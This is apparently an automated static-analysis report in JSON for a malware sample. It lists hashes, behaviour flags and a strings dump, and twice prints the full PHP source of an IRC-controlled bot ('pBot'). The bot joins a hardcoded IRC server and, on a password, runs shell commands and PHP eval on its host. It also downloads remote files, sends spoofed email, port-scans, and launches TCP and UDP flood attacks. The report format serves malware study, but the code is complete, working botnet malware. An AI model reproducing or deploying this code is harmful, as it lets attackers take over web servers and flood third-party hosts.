{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "chr": "May attempt to obfuscate specific str",
            "command": "May run PowerShell commands",
            "exec": "May run an executable file or a system command using Excel 4 Macros",
            "kill": "May delete a file",
            "popen": "May run an executable file or a system command on a Mac",
            "system": "May run an executable file or a system command on a Mac"
        },
        "macro": "= COMMANDS ============================================================================\n .user <password>                                              //login to the bot\n .logout                                                       //logout of the bot\n .die                                                          //kill the bot\n .restart                                                      //restart the bot\n .mail <to> <from> <subject> <msg>                             //send an email\n .dns <IP|HOST>                                                //dns lookup\n .download <URL> <filename>                                    //download a file\n .exec <cmd>  // uses shell_exec()                             //execute a command\n .cmd <cmd> // uses popen()                                    //execute a command\n .info                                                         //get system information\n .php <php code> // uses eval()                                //execute php code\n .tcpflood <target> <packets> <packetsize> <port> <delay>      //tcpflood attack\n .udpflood <target> <packets> <packetsize> <delay>             //udpflood attack\n .raw <cmd>                                                    //raw IRC command FIXED by towzAo\n .rndnick                                                      //change nickname\n .pscan <host> <port>                                          //port scan\n .ud.server <newhost> <newport> [newpass]                      //change IRC server\n---------------------------------------------------------------------------------------\n\n <? \n\nset_time_limit(0); \nerror_reporting(0); \n\nclass pBot \n{ \nvar $config = array(\"server\"=>\"irc.byroe.net\", \n                     \"port\"=>6667, \n                     \"pass\"=>\"aii\", //senha do server\n                     \"prefix\"=>\"cakep\", \n                     \"maxrand\"=>5, \n                     \"chan\"=>\"#gar\", \n                     \"key\"=>\"x\", //senha do canal\n                     \"modes\"=>\"+p\", \n                     \"password\"=>\"ulfa\",  //senha do bot\n                     \"trigger\"=>\".\", \n                     \"hostauth\"=>\"garculas\" // * for any hostname \n                     ); \n var $users = array(); \n function start() \n { \n    if(!($this->conn = fsockopen($this->config['server'],$this->config['port'],$e,$s,30))) \n       $this->start(); \n    $ident = \"xd\"; \n    $alph = range(\"a\",\"z\"); \n    for($i=0;$i<$this->config['maxrand'];$i++) \n       $ident .= $alph[rand(0,25)]; \n    if(strlen($this->config['pass'])>0) \n       $this->send(\"PASS \".$this->config['pass']); \n    $this->send(\"USER $ident 127.0.0.1 localhost :$ident\"); \n    $this->set_nick(); \n    $this->main(); \n } \n function main() \n { \n    while(!feof($this->conn)) \n    { \n       $this->buf = trim(fgets($this->conn,512)); \n       $cmd = explode(\" \",$this->buf); \n       if(substr($this->buf,0,6)==\"PING :\") \n       { \n          $this->send(\"PONG :\".substr($this->buf,6)); \n       } \n       if(isset($cmd[1]) && $cmd[1] ==\"001\") \n       { \n          $this->send(\"MODE \".$this->nick.\" \".$this->config['modes']); \n          $this->join($this->config['chan'],$this->config['key']); \n       } \n       if(isset($cmd[1]) && $cmd[1]==\"433\") \n       { \n          $this->set_nick(); \n       } \n       if($this->buf != $old_buf) \n       { \n          $mcmd = array(); \n          $msg = substr(strstr($this->buf,\" :\"),2); \n          $msgcmd = explode(\" \",$msg); \n          $nick = explode(\"!\",$cmd[0]); \n          $vhost = explode(\"@\",$nick[1]); \n          $vhost = $vhost[1]; \n          $nick = substr($nick[0],1); \n          $host = $cmd[0]; \n          if($msgcmd[0]==$this->nick) \n          { \n           for($i=0;$i<count($msgcmd);$i++) \n              $mcmd[$i] = $msgcmd[$i+1]; \n          } \n          else \n          { \n           for($i=0;$i<count($msgcmd);$i++) \n              $mcmd[$i] = $msgcmd[$i]; \n          } \n          if(count($cmd)>2) \n          { \n             switch($cmd[1]) \n             { \n                case \"QUIT\": \n                   if($this->is_logged_in($host)) \n                   { \n                      $this->log_out($host); \n                   } \n                break; \n                case \"PART\": \n                   if($this->is_logged_in($host)) \n                   { \n                      $this->log_out($host); \n                   } \n                break; \n                case \"PRIVMSG\": \n                   if(!$this->is_logged_in($host) && ($vhost == $this->config['hostauth'] || $this->config['hostauth'] == \"*\")) \n                   { \n                      if(substr($mcmd[0],0,1)==\".\") \n                      { \n                         switch(substr($mcmd[0],1)) \n                         { \n                            case \"user\": \n                              if($mcmd[1]==$this->config['password']) \n                              { \n                                 $this->privmsg($this->config['chan'],\"[\\2Auth\\2]: $nick logged in\"); \n                                 $this->log_in($host); \n                              } \n                              else \n                              { \n                                 $this->privmsg($this->config['chan'],\"[\\2Auth\\2]: Incorrect password from $nick\"); \n                              } \n                            break; \n                         } \n                      } \n                   } \n                   elseif($this->is_logged_in($host)) \n                   { \n                      if(substr($mcmd[0],0,1)==\".\") \n                      { \n                         switch(substr($mcmd[0],1)) \n                         { \n                            case \"restart\": \n                               $this->send(\"QUIT :restart\"); \n                               fclose($this->conn); \n                               $this->start(); \n                            break; \n                            case \"mail\": //mail to from subject message \n                               if(count($mcmd)>4) \n                               { \n                                  $header = \"From: <\".$mcmd[2].\">\"; \n                                  if(!mail($mcmd[1],$mcmd[3],strstr($msg,$mcmd[4]),$header)) \n                                  { \n                                     $this->privmsg($this->config['chan'],\"[\\2mail\\2]: Unable to send\"); \n                                  } \n                                  else \n                                  { \n                                     $this->privmsg($this->config['chan'],\"[\\2mail\\2]: Message sent to \\2\".$mcmd[1].\"\\2\"); \n                                  } \n                               } \n                            break; \n                            case \"dns\": \n                               if(isset($mcmd[1])) \n                               { \n                                  $ip = explode(\".\",$mcmd[1]); \n                                  if(count($ip)==4 && is_numeric($ip[0]) && is_numeric($ip[1]) && is_numeric($ip[2]) && is_numeric($ip[3])) \n                                  { \n                                     $this->privmsg($this->config['chan'],\"[\\2dns\\2]: \".$mcmd[1].\" => \".gethostbyaddr($mcmd[1])); \n                                  } \n                                  else \n                                  { \n                                     $this->privmsg($this->config['chan'],\"[\\2dns\\2]: \".$mcmd[1].\" => \".gethostbyname($mcmd[1])); \n                                  } \n                               } \n                            break; \n                            case \"info\": \n                               $this->privmsg($this->config['chan'],\"[\\2info\\2]: [\\2httpd\\2: \".$_SERVER['SERVER_SOFTWARE'].\"] [\\2docroot\\2: \".$_SERVER['DOCUMENT_ROOT'].\"] [\\2domain\\2: \".$_SERVER['SERVER_NAME'].\"] [\\2admin\\2: \".$_SERVER['SERVER_ADMIN'].\"] [\\2url\\2:\".$_SERVER['REQUEST_URI'].\"]\"); \n                            break;\n                            case \"bot\": \n                               $this->privmsg($this->config['chan'],\"[\\2Bot by Pathloader| v1.0 [www.kamtiez.biz]\\2]\"); \n                            break;\n                            case \"cmd\": \n                               if(isset($mcmd[1])) \n                               { \n                                  $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); \n                                  $this->privmsg($this->config['chan'],\"[\\2cmd\\2]: $command\"); \n                                  $pipe = popen($command,\"r\"); \n                                  while(!feof($pipe)) \n                                  { \n                                     $pbuf = trim(fgets($pipe,512)); \n                                     if($pbuf != NULL) \n                                        $this->privmsg($this->config['chan'],\"     : $pbuf\"); \n                                  } \n                                  pclose($pipe); \n                               } \n                            break; \n                            case \"rndnick\": \n                               $this->set_nick(); \n                            break; \n                            case \"raw\": \n                               $this->send(strstr($msg,$mcmd[1])); \n                            break; \n                            case \"php\":\n                               $eval = eval(substr(strstr($msg,$mcmd[1]),strlen($mcmd[1]))); \n                            break; \n                            case \"exec\": \n                               $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); \n                               $exec = shell_exec($command); \n                               $ret = explode(\"\\n\",$exec); \n                               $this->privmsg($this->config['chan'],\"[\\2exec\\2]: $command\"); \n                               for($i=0;$i<count($ret);$i++) \n                                  if($ret[$i]!=NULL) \n                                     $this->privmsg($this->config['chan'],\"      : \".trim($ret[$i])); \n                            break; \n                            case \"pscan\": // .pscan 127.0.0.1 6667 \n                               if(count($mcmd) > 2) \n                               { \n                                  if(fsockopen($mcmd[1],$mcmd[2],$e,$s,15)) \n                                     $this->privmsg($this->config['chan'],\"[\\2pscan\\2]: \".$mcmd[1].\":\".$mcmd[2].\" is \\2open\\2\"); \n                                  else \n                                     $this->privmsg($this->config['chan'],\"[\\2pscan\\2]: \".$mcmd[1].\":\".$mcmd[2].\" is \\2closed\\2\"); \n                               } \n                            break; \n                            case \"ud.server\": // .udserver <server> <port> [password] \n                               if(count($mcmd)>2) \n                               { \n                                  $this->config['server'] = $mcmd[1]; \n                                  $this->config['port'] = $mcmd[2]; \n                                  if(isset($mcmcd[3])) \n                                  { \n                                   $this->config['pass'] = $mcmd[3]; \n                                   $this->privmsg($this->config['chan'],\"[\\2update\\2]: Changed server to \".$mcmd[1].\":\".$mcmd[2].\" Pass: \".$mcmd[3]); \n                                  } \n                                  else \n                                  { \n                                     $this->privmsg($this->config['chan'],\"[\\2update\\2]: Changed server to \".$mcmd[1].\":\".$mcmd[2]); \n                                  } \n                               } \n                            break; \n                            case \"download\": \n                               if(count($mcmd) > 2) \n                               { \n                                  if(!$fp = fopen($mcmd[2],\"w\")) \n                                  { \n                                     $this->privmsg($this->config['chan'],\"[\\2download\\2]: Cannot download, permission denied.\"); \n                                  } \n                                  else \n                                  { \n                                     if(!$get = file($mcmd[1])) \n                                     { \n                                        $this->privmsg($this->config['chan'],\"[\\2download\\2]: Unable to download from \\2\".$mcmd[1].\"\\2\"); \n                                     } \n                                     else \n                                     { \n                                        for($i=0;$i<=count($get);$i++) \n                                        { \n                                           fwrite($fp,$get[$i]); \n                                        } \n                                        $this->privmsg($this->config['chan'],\"[\\2download\\2]: File \\2\".$mcmd[1].\"\\2 downloaded to \\2\".$mcmd[2].\"\\2\"); \n                                     } \n                                     fclose($fp); \n                                  } \n                               } \n                            break; \n                            case \"die\": \n                               $this->send(\"QUIT :die command from $nick\"); \n                               fclose($this->conn); \n                               exit; \n                            case \"logout\": \n                               $this->log_out($host); \n                               $this->privmsg($this->config['chan'],\"[\\2auth\\2]: $nick logged out\"); \n                            break; \n                            case \"udpflood\": \n                               if(count($mcmd)>3) \n                               { \n                                  $this->udpflood($mcmd[1],$mcmd[2],$mcmd[3]); \n                               } \n                            break; \n                            case \"tcpflood\": \n                               if(count($mcmd)>5) \n                               { \n                                  $this->tcpflood($mcmd[1],$mcmd[2],$mcmd[3],$mcmd[4],$mcmd[5]); \n                               } \n                            break; \n                         } \n                      } \n                   } \n                break; \n             } \n          } \n       } \n       $old_buf = $this->buf; \n    } \n    $this->start(); \n } \n function send($msg) \n { \n    fwrite($this->conn,\"$msg\\r\\n\"); \n\n } \n function join($chan,$key=NULL) \n { \n    $this->send(\"JOIN $chan $key\"); \n }\n function privmsg($to,$msg) \n { \n    $this->send(\"PRIVMSG $to :$msg\"); \n } \n function is_logged_in($host) \n { \n    if(isset($this->users[$host])) \n       return 1; \n    else \n       return 0; \n } \n function log_in($host) \n { \n    $this->users[$host] = true; \n } \n function log_out($host) \n { \n    unset($this->users[$host]); \n } \n function set_nick() \n { \n    if(isset($_SERVER['SERVER_SOFTWARE'])) \n    { \n       if(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),\"apache\")) \n          $this->nick = \"\"; \n       elseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),\"iis\")) \n          $this->nick = \"\"; \n       elseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),\"xitami\")) \n          $this->nick = \"[X]\"; \n       else \n          $this->nick = \"[U]\"; \n    } \n    else \n    { \n       $this->nick = \"[C]\"; \n    } \n    $this->nick .= $this->config['prefix']; \n    for($i=0;$i<$this->config['maxrand'];$i++) \n       $this->nick .= mt_rand(0,9); \n    $this->send(\"NICK \".$this->nick); \n } \n  function udpflood($host,$packetsize,$time) {\n\t$this->privmsg($this->config['chan'],\"[\\2UdpFlood Started!\\2]\"); \n\t$packet = \"\";\n\tfor($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }\n\t$timei = time();\n\t$i = 0;\n\twhile(time()-$timei < $time) {\n\t\t$fp=fsockopen(\"udp://\".$host,mt_rand(0,6000),$e,$s,5);\n      \tfwrite($fp,$packet);\n       \tfclose($fp);\n\t\t$i++;\n\t}\n\t$env = $i * $packetsize;\n\t$env = $env / 1048576;\n\t$vel = $env / $time;\n\t$vel = round($vel);\n\t$env = round($env);\n\t$this->privmsg($this->config['chan'],\"[\\2UdpFlood Finished!\\2]: $env MB enviados / Media: $vel MB/s \");\n}\n function tcpflood($host,$packets,$packetsize,$port,$delay) \n { \n    $this->privmsg($this->config['chan'],\"[\\2TcpFlood Started!\\2]\"); \n    $packet = \"\"; \n    for($i=0;$i<$packetsize;$i++) \n       $packet .= chr(mt_rand(1,256)); \n    for($i=0;$i<$packets;$i++) \n    { \n       if(!$fp=fsockopen(\"tcp://\".$host,$port,$e,$s,5)) \n       { \n          $this->privmsg($this->config['chan'],\"[\\2tcpflood\\2]: Error: <$e>\"); \n          return 0; \n       } \n       else \n       { \n          fwrite($fp,$packet); \n          fclose($fp); \n       } \n       sleep($delay); \n    } \n    $this->privmsg($this->config['chan'],\"[\\2TcpFlood Finished!\\2]: Config - $packets packets to $host:$port.\"); \n } \n} \n\n$bot = new pBot; \n$bot->start(); \n\n?>\n"
    },
    "filename": "VirusShare_329bdd27a6dd8bf4b0c6d19d76123e25",
    "filesize": 17037,
    "filetype": "C source, ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "329bdd27a6dd8bf4b0c6d19d76123e25",
        "sha1": "d30b37240bd2a6aa133fcaaba9c6052db2e74280",
        "sha256": "31d0cd8865365ec9429e5be0610cee0d101328d6dc4bcc29651e524431d55e5d"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "= COMMANDS ============================================================================",
            " .user <password>                                              //login to the bot",
            " .logout                                                       //logout of the bot",
            " .die                                                          //kill the bot",
            " .restart                                                      //restart the bot",
            " .mail <to> <from> <subject> <msg>                             //send an email",
            " .dns <IP|HOST>                                                //dns lookup",
            " .download <URL> <filename>                                    //download a file",
            " .exec <cmd>  // uses shell_exec()                             //execute a command",
            " .cmd <cmd> // uses popen()                                    //execute a command",
            " .info                                                         //get system information",
            " .php <php code> // uses eval()                                //execute php code",
            " .tcpflood <target> <packets> <packetsize> <port> <delay>      //tcpflood attack",
            " .udpflood <target> <packets> <packetsize> <delay>             //udpflood attack",
            " .raw <cmd>                                                    //raw IRC command FIXED by towzAo",
            " .rndnick                                                      //change nickname",
            " .pscan <host> <port>                                          //port scan",
            " .ud.server <newhost> <newport> [newpass]                      //change IRC server",
            "---------------------------------------------------------------------------------------",
            " <? ",
            "set_time_limit(0); ",
            "error_reporting(0); ",
            "class pBot ",
            "var $config = array(\"server\"=>\"irc.byroe.net\", ",
            "                     \"port\"=>6667, ",
            "                     \"pass\"=>\"aii\", //senha do server",
            "                     \"prefix\"=>\"cakep\", ",
            "                     \"maxrand\"=>5, ",
            "                     \"chan\"=>\"#gar\", ",
            "                     \"key\"=>\"x\", //senha do canal",
            "                     \"modes\"=>\"+p\", ",
            "                     \"password\"=>\"ulfa\",  //senha do bot",
            "                     \"trigger\"=>\".\", ",
            "                     \"hostauth\"=>\"garculas\" // * for any hostname ",
            "                     ); ",
            " var $users = array(); ",
            " function start() ",
            "    if(!($this->conn = fsockopen($this->config['server'],$this->config['port'],$e,$s,30))) ",
            "       $this->start(); ",
            "    $ident = \"xd\"; ",
            "    $alph = range(\"a\",\"z\"); ",
            "    for($i=0;$i<$this->config['maxrand'];$i++) ",
            "       $ident .= $alph[rand(0,25)]; ",
            "    if(strlen($this->config['pass'])>0) ",
            "       $this->send(\"PASS \".$this->config['pass']); ",
            "    $this->send(\"USER $ident 127.0.0.1 localhost :$ident\"); ",
            "    $this->set_nick(); ",
            "    $this->main(); ",
            " function main() ",
            "    while(!feof($this->conn)) ",
            "    { ",
            "       $this->buf = trim(fgets($this->conn,512)); ",
            "       $cmd = explode(\" \",$this->buf); ",
            "       if(substr($this->buf,0,6)==\"PING :\") ",
            "       { ",
            "          $this->send(\"PONG :\".substr($this->buf,6)); ",
            "       } ",
            "       if(isset($cmd[1]) && $cmd[1] ==\"001\") ",
            "       { ",
            "          $this->send(\"MODE \".$this->nick.\" \".$this->config['modes']); ",
            "          $this->join($this->config['chan'],$this->config['key']); ",
            "       } ",
            "       if(isset($cmd[1]) && $cmd[1]==\"433\") ",
            "       { ",
            "          $this->set_nick(); ",
            "       } ",
            "       if($this->buf != $old_buf) ",
            "       { ",
            "          $mcmd = array(); ",
            "          $msg = substr(strstr($this->buf,\" :\"),2); ",
            "          $msgcmd = explode(\" \",$msg); ",
            "          $nick = explode(\"!\",$cmd[0]); ",
            "          $vhost = explode(\"@\",$nick[1]); ",
            "          $vhost = $vhost[1]; ",
            "          $nick = substr($nick[0],1); ",
            "          $host = $cmd[0]; ",
            "          if($msgcmd[0]==$this->nick) ",
            "          { ",
            "           for($i=0;$i<count($msgcmd);$i++) ",
            "              $mcmd[$i] = $msgcmd[$i+1]; ",
            "          } ",
            "          else ",
            "          { ",
            "           for($i=0;$i<count($msgcmd);$i++) ",
            "              $mcmd[$i] = $msgcmd[$i]; ",
            "          } ",
            "          if(count($cmd)>2) ",
            "          { ",
            "             switch($cmd[1]) ",
            "             { ",
            "                case \"QUIT\": ",
            "                   if($this->is_logged_in($host)) ",
            "                   { ",
            "                      $this->log_out($host); ",
            "                   } ",
            "                break; ",
            "                case \"PART\": ",
            "                   if($this->is_logged_in($host)) ",
            "                   { ",
            "                      $this->log_out($host); ",
            "                   } ",
            "                break; ",
            "                case \"PRIVMSG\": ",
            "                   if(!$this->is_logged_in($host) && ($vhost == $this->config['hostauth'] || $this->config['hostauth'] == \"*\")) ",
            "                   { ",
            "                      if(substr($mcmd[0],0,1)==\".\") ",
            "                      { ",
            "                         switch(substr($mcmd[0],1)) ",
            "                         { ",
            "                            case \"user\": ",
            "                              if($mcmd[1]==$this->config['password']) ",
            "                              { ",
            "                                 $this->privmsg($this->config['chan'],\"[\\2Auth\\2]: $nick logged in\"); ",
            "                                 $this->log_in($host); ",
            "                              } ",
            "                              else ",
            "                              { ",
            "                                 $this->privmsg($this->config['chan'],\"[\\2Auth\\2]: Incorrect password from $nick\"); ",
            "                              } ",
            "                            break; ",
            "                         } ",
            "                      } ",
            "                   } ",
            "                   elseif($this->is_logged_in($host)) ",
            "                   { ",
            "                      if(substr($mcmd[0],0,1)==\".\") ",
            "                      { ",
            "                         switch(substr($mcmd[0],1)) ",
            "                         { ",
            "                            case \"restart\": ",
            "                               $this->send(\"QUIT :restart\"); ",
            "                               fclose($this->conn); ",
            "                               $this->start(); ",
            "                            break; ",
            "                            case \"mail\": //mail to from subject message ",
            "                               if(count($mcmd)>4) ",
            "                               { ",
            "                                  $header = \"From: <\".$mcmd[2].\">\"; ",
            "                                  if(!mail($mcmd[1],$mcmd[3],strstr($msg,$mcmd[4]),$header)) ",
            "                                  { ",
            "                                     $this->privmsg($this->config['chan'],\"[\\2mail\\2]: Unable to send\"); ",
            "                                  } ",
            "                                  else ",
            "                                  { ",
            "                                     $this->privmsg($this->config['chan'],\"[\\2mail\\2]: Message sent to \\2\".$mcmd[1].\"\\2\"); ",
            "                                  } ",
            "                               } ",
            "                            break; ",
            "                            case \"dns\": ",
            "                               if(isset($mcmd[1])) ",
            "                               { ",
            "                                  $ip = explode(\".\",$mcmd[1]); ",
            "                                  if(count($ip)==4 && is_numeric($ip[0]) && is_numeric($ip[1]) && is_numeric($ip[2]) && is_numeric($ip[3])) ",
            "                                  { ",
            "                                     $this->privmsg($this->config['chan'],\"[\\2dns\\2]: \".$mcmd[1].\" => \".gethostbyaddr($mcmd[1])); ",
            "                                  } ",
            "                                  else ",
            "                                  { ",
            "                                     $this->privmsg($this->config['chan'],\"[\\2dns\\2]: \".$mcmd[1].\" => \".gethostbyname($mcmd[1])); ",
            "                                  } ",
            "                               } ",
            "                            break; ",
            "                            case \"info\": ",
            "                               $this->privmsg($this->config['chan'],\"[\\2info\\2]: [\\2httpd\\2: \".$_SERVER['SERVER_SOFTWARE'].\"] [\\2docroot\\2: \".$_SERVER['DOCUMENT_ROOT'].\"] [\\2domain\\2: \".$_SERVER['SERVER_NAME'].\"] [\\2admin\\2: \".$_SERVER['SERVER_ADMIN'].\"] [\\2url\\2:\".$_SERVER['REQUEST_URI'].\"]\"); ",
            "                            break;",
            "                            case \"bot\": ",
            "                               $this->privmsg($this->config['chan'],\"[\\2Bot by Pathloader| v1.0 [www.kamtiez.biz]\\2]\"); ",
            "                            break;",
            "                            case \"cmd\": ",
            "                               if(isset($mcmd[1])) ",
            "                               { ",
            "                                  $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); ",
            "                                  $this->privmsg($this->config['chan'],\"[\\2cmd\\2]: $command\"); ",
            "                                  $pipe = popen($command,\"r\"); ",
            "                                  while(!feof($pipe)) ",
            "                                  { ",
            "                                     $pbuf = trim(fgets($pipe,512)); ",
            "                                     if($pbuf != NULL) ",
            "                                        $this->privmsg($this->config['chan'],\"     : $pbuf\"); ",
            "                                  } ",
            "                                  pclose($pipe); ",
            "                               } ",
            "                            break; ",
            "                            case \"rndnick\": ",
            "                               $this->set_nick(); ",
            "                            break; ",
            "                            case \"raw\": ",
            "                               $this->send(strstr($msg,$mcmd[1])); ",
            "                            break; ",
            "                            case \"php\":",
            "                               $eval = eval(substr(strstr($msg,$mcmd[1]),strlen($mcmd[1]))); ",
            "                            break; ",
            "                            case \"exec\": ",
            "                               $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); ",
            "                               $exec = shell_exec($command); ",
            "                               $ret = explode(\"\\n\",$exec); ",
            "                               $this->privmsg($this->config['chan'],\"[\\2exec\\2]: $command\"); ",
            "                               for($i=0;$i<count($ret);$i++) ",
            "                                  if($ret[$i]!=NULL) ",
            "                                     $this->privmsg($this->config['chan'],\"      : \".trim($ret[$i])); ",
            "                            break; ",
            "                            case \"pscan\": // .pscan 127.0.0.1 6667 ",
            "                               if(count($mcmd) > 2) ",
            "                               { ",
            "                                  if(fsockopen($mcmd[1],$mcmd[2],$e,$s,15)) ",
            "                                     $this->privmsg($this->config['chan'],\"[\\2pscan\\2]: \".$mcmd[1].\":\".$mcmd[2].\" is \\2open\\2\"); ",
            "                                  else ",
            "                                     $this->privmsg($this->config['chan'],\"[\\2pscan\\2]: \".$mcmd[1].\":\".$mcmd[2].\" is \\2closed\\2\"); ",
            "                               } ",
            "                            break; ",
            "                            case \"ud.server\": // .udserver <server> <port> [password] ",
            "                               if(count($mcmd)>2) ",
            "                               { ",
            "                                  $this->config['server'] = $mcmd[1]; ",
            "                                  $this->config['port'] = $mcmd[2]; ",
            "                                  if(isset($mcmcd[3])) ",
            "                                  { ",
            "                                   $this->config['pass'] = $mcmd[3]; ",
            "                                   $this->privmsg($this->config['chan'],\"[\\2update\\2]: Changed server to \".$mcmd[1].\":\".$mcmd[2].\" Pass: \".$mcmd[3]); ",
            "                                  } ",
            "                                  else ",
            "                                  { ",
            "                                     $this->privmsg($this->config['chan'],\"[\\2update\\2]: Changed server to \".$mcmd[1].\":\".$mcmd[2]); ",
            "                                  } ",
            "                               } ",
            "                            break; ",
            "                            case \"download\": ",
            "                               if(count($mcmd) > 2) ",
            "                               { ",
            "                                  if(!$fp = fopen($mcmd[2],\"w\")) ",
            "                                  { ",
            "                                     $this->privmsg($this->config['chan'],\"[\\2download\\2]: Cannot download, permission denied.\"); ",
            "                                  } ",
            "                                  else ",
            "                                  { ",
            "                                     if(!$get = file($mcmd[1])) ",
            "                                     { ",
            "                                        $this->privmsg($this->config['chan'],\"[\\2download\\2]: Unable to download from \\2\".$mcmd[1].\"\\2\"); ",
            "                                     } ",
            "                                     else ",
            "                                     { ",
            "                                        for($i=0;$i<=count($get);$i++) ",
            "                                        { ",
            "                                           fwrite($fp,$get[$i]); ",
            "                                        } ",
            "                                        $this->privmsg($this->config['chan'],\"[\\2download\\2]: File \\2\".$mcmd[1].\"\\2 downloaded to \\2\".$mcmd[2].\"\\2\"); ",
            "                                     } ",
            "                                     fclose($fp); ",
            "                                  } ",
            "                               } ",
            "                            break; ",
            "                            case \"die\": ",
            "                               $this->send(\"QUIT :die command from $nick\"); ",
            "                               fclose($this->conn); ",
            "                               exit; ",
            "                            case \"logout\": ",
            "                               $this->log_out($host); ",
            "                               $this->privmsg($this->config['chan'],\"[\\2auth\\2]: $nick logged out\"); ",
            "                            break; ",
            "                            case \"udpflood\": ",
            "                               if(count($mcmd)>3) ",
            "                               { ",
            "                                  $this->udpflood($mcmd[1],$mcmd[2],$mcmd[3]); ",
            "                               } ",
            "                            break; ",
            "                            case \"tcpflood\": ",
            "                               if(count($mcmd)>5) ",
            "                               { ",
            "                                  $this->tcpflood($mcmd[1],$mcmd[2],$mcmd[3],$mcmd[4],$mcmd[5]); ",
            "                               } ",
            "                            break; ",
            "                         } ",
            "                      } ",
            "                   } ",
            "                break; ",
            "             } ",
            "          } ",
            "       } ",
            "       $old_buf = $this->buf; ",
            "    } ",
            "    $this->start(); ",
            " function send($msg) ",
            "    fwrite($this->conn,\"$msg\\r\\n\"); ",
            " function join($chan,$key=NULL) ",
            "    $this->send(\"JOIN $chan $key\"); ",
            " function privmsg($to,$msg) ",
            "    $this->send(\"PRIVMSG $to :$msg\"); ",
            " function is_logged_in($host) ",
            "    if(isset($this->users[$host])) ",
            "       return 1; ",
            "    else ",
            "       return 0; ",
            " function log_in($host) ",
            "    $this->users[$host] = true; ",
            " function log_out($host) ",
            "    unset($this->users[$host]); ",
            " function set_nick() ",
            "    if(isset($_SERVER['SERVER_SOFTWARE'])) ",
            "    { ",
            "       if(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),\"apache\")) ",
            "          $this->nick = \"\"; ",
            "       elseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),\"iis\")) ",
            "          $this->nick = \"\"; ",
            "       elseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),\"xitami\")) ",
            "          $this->nick = \"[X]\"; ",
            "       else ",
            "          $this->nick = \"[U]\"; ",
            "    } ",
            "    else ",
            "    { ",
            "       $this->nick = \"[C]\"; ",
            "    } ",
            "    $this->nick .= $this->config['prefix']; ",
            "    for($i=0;$i<$this->config['maxrand'];$i++) ",
            "       $this->nick .= mt_rand(0,9); ",
            "    $this->send(\"NICK \".$this->nick); ",
            "  function udpflood($host,$packetsize,$time) {",
            "\t$this->privmsg($this->config['chan'],\"[\\2UdpFlood Started!\\2]\"); ",
            "\t$packet = \"\";",
            "\tfor($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }",
            "\t$timei = time();",
            "\t$i = 0;",
            "\twhile(time()-$timei < $time) {",
            "\t\t$fp=fsockopen(\"udp://\".$host,mt_rand(0,6000),$e,$s,5);",
            "      \tfwrite($fp,$packet);",
            "       \tfclose($fp);",
            "\t\t$i++;",
            "\t$env = $i * $packetsize;",
            "\t$env = $env / 1048576;",
            "\t$vel = $env / $time;",
            "\t$vel = round($vel);",
            "\t$env = round($env);",
            "\t$this->privmsg($this->config['chan'],\"[\\2UdpFlood Finished!\\2]: $env MB enviados / Media: $vel MB/s \");",
            " function tcpflood($host,$packets,$packetsize,$port,$delay) ",
            "    $this->privmsg($this->config['chan'],\"[\\2TcpFlood Started!\\2]\"); ",
            "    $packet = \"\"; ",
            "    for($i=0;$i<$packetsize;$i++) ",
            "       $packet .= chr(mt_rand(1,256)); ",
            "    for($i=0;$i<$packets;$i++) ",
            "    { ",
            "       if(!$fp=fsockopen(\"tcp://\".$host,$port,$e,$s,5)) ",
            "       { ",
            "          $this->privmsg($this->config['chan'],\"[\\2tcpflood\\2]: Error: <$e>\"); ",
            "          return 0; ",
            "       } ",
            "       else ",
            "       { ",
            "          fwrite($fp,$packet); ",
            "          fclose($fp); ",
            "       } ",
            "       sleep($delay); ",
            "    } ",
            "    $this->privmsg($this->config['chan'],\"[\\2TcpFlood Finished!\\2]: Config - $packets packets to $host:$port.\"); ",
            "$bot = new pBot; ",
            "$bot->start(); "
        ],
        "file": {},
        "fuzzing": {},
        "ip": [
            "127.0.0.1"
        ],
        "url": []
    },
    "time": "0:00:00.437503",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
